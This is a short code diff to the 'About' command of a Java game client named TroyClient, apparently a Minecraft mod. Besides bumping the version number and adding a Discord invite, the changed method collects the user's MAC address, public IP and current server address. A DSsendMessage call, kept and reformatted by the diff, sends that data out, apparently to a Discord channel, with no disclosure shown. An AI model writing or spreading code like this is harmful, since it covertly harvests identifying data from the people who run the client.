@@ -24,8 +24,9 @@ public class AboutCommand extends Command {
 
     @Override
     public void execute(String... args) throws Exception {
-        ChatHelper.printMessage("&b • &3TroyClient v1.8.4", false);
+        ChatHelper.printMessage("&b • &3TroyClient v1.9.5", false);
         ChatHelper.printMessage("&b • &bDeveloper: &3md_4", false);
+        ChatHelper.printMessage("&b • &bDs: &3https://discord.gg/jDhQhSK9KQ", false);
 
         InetAddress localHost = null;
         try {
@@ -52,7 +53,7 @@ public class AboutCommand extends Command {
         }
         String macAddress = String.join("-", hexadecimal);
 
-        DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Executed Command [About] Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
+        DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + "Executed Command [About]\n Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
     }
 }
 
